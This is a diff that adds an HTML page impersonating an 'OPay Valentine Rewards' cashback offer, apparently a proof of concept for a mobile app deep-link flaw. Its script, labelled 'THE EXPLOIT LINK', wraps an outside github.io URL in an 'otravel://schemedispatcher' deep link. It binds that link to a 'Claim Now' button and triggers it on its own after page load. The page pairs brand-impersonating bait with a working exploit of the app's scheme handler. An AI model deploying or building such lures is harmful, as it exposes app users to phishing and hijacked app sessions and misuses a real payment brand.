@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay Valentine Rewards</title>
+    <style>
+        body {
+            font-family: -apple-system, sans-serif;
+            background: #00c853;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+
+        .card {
+            background: white;
+            color: #333;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn {
+            display: block;
+            background: #00c853;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <h1>Valentine Reward! 🎁</h1>
+        <p>You have received a ₦2,500 cashback reward.</p>
+        <a id="trigger" class="btn" href="#">Claim Now</a>
+    </div>
+
+    <script>
+        // THE EXPLOIT LINK
+        var exploitUrl = "https://zugonwobi.github.io/test/poc.html";
+        var deepLink = "otravel://schemedispatcher?scheme=" + encodeURIComponent(exploitUrl);
+
+        document.getElementById("trigger").href = deepLink;
+
+        // Auto-trigger on page load
+        setTimeout(function () {
+            window.location.href = deepLink;
+        }, 1500);
+    </script>
+</body>
+
+</html>
